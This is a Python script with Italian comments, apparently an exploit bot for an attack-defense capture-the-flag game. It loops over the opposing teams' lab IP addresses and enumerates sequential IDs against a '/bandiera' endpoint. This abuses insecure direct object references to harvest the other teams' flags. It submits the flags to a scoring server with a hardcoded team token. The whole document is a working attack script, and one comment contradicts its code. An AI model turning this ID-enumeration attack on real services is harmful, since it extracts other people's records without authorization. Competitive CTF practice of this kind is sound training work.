import requests
import json
import re
import time

# Regex per validare la bandiera: esattamente 31 caratteri alfanumerici (maiuscoli e numeri) seguiti da '='
pattern = r"^[A-Z0-9]{31}=$"

# Endpoint del server che riceve i flag validi
flagserver = "http://10.254.0.1/flags"

# Per ciascun team (identificato da x in IP 10.60.x.1) partiamo da un determinato ID
team_ids = {x: 141 for x in range(0, 7)}

# Definisci quanti ID vuoi testare per ogni iterazione (per team) e quante flag finali prendere
IDS_PER_ITERATION = 50  # testiamo 50 ID per iterazione
LAST_N_FLAGS = 20        # prendiamo le ultime 3 flag valide
while True:
    final_flags = []  # Lista complessiva dei flag da inviare

    # Per ogni team (IP 10.60.x.1, con x da 0 a 6)
    for team in range(0, 7):
        url = f"http://10.60.{team}.1:8181/bandiera"
        start_id = team_ids[team]
        end_id = start_id + IDS_PER_ITERATION

        valid_flags = []  # Flag valide per il team in questa iterazione

        print(f"Team {team}: test degli ID da {start_id} a {end_id}")
        # Cicla su tutti gli ID nel range stabilito
        for id_val in range(start_id, end_id + 1):
            try:
                # Effettua la richiesta GET con il JSON contenente l'id
                response = requests.get(url, json={"id": id_val})
                response.raise_for_status()
                result = response.json()
            except Exception as e:
                print(f"Team {team} - ID {id_val}: errore {e}")
                continue

            if "bandiera" in result:
                flag = result["bandiera"]
                if re.fullmatch(pattern, flag):
                    print(f"Team {team} - ID {id_val}: flag valida trovata -> {flag}")
                    valid_flags.append(flag)
                else:
                    print(f"Team {team} - ID {id_val}: flag non valida ({flag})")
            else:
                print(f"Team {team} - ID {id_val}: risposta inattesa")
        
        # Aggiorna l'ID di partenza per il prossimo ciclo per il team
        team_ids[team] = end_id + 1

        # Se sono state trovate flag valide, prendi le ultime LAST_N_FLAGS (se ce ne sono meno, prendi tutte)
        if valid_flags:
            chosen_flags = valid_flags[-LAST_N_FLAGS:]
            print(f"Team {team}: flag prese -> {chosen_flags}")
            final_flags.extend(chosen_flags)
        else:
            print(f"Team {team}: nessuna flag valida trovata in questo range.")

    # Invio dei flag validi raccolti al server, se ce ne sono
    if final_flags:
        try:
            r = requests.put(flagserver, headers={"X-Team-Token": "13f9642dfdb510ef"}, json=final_flags)
            r.raise_for_status()
            print(f"Flag inviati con successo: {final_flags}")
            print("Risposta dal server:", r.text)
        except requests.HTTPError as e:
            print(f"Errore durante l'invio dei flag: {e}")
        except Exception as e:
            print(f"Errore durante l'invio dei flag: {e}")
    else:
        print("Nessuna flag valida raccolta in questa iterazione.")

    # Attesa prima della prossima iterazione
    time.sleep(1)
